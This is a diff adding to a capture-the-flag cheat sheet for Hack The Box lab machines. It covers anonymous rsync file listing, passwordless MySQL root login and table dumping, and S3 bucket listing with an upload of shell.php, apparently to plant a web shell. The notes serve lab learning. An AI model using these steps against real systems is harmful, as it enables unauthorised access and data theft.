@@ -38,3 +38,15 @@
  - `rsync --list-only 10.129.204.156::` list directories.
  - `rsync --list-only 10.129.204.156::public` list files within directory, here named public.
  - `rsync {target_IP}::public/flag.txt flag.txt` bring remote flag.txt in my machine.
+
+### Mysql
+ - `mysql -h <ip> -u root` to login.
+ - SHOW databases; : Prints out the databases we can access.
+ - USE {database_name}; : Set to use the database named {database_name}.
+ - SHOW tables; : Prints out the available tables inside the current database.
+ - SELECT * FROM {table_name}; : Prints out all the data from the table {table_name}.
+
+### AWS s3
+ - aws --endpoint=http://s3.thetoppers.htb s3 ls
+ - aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+ - `aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb` to upload
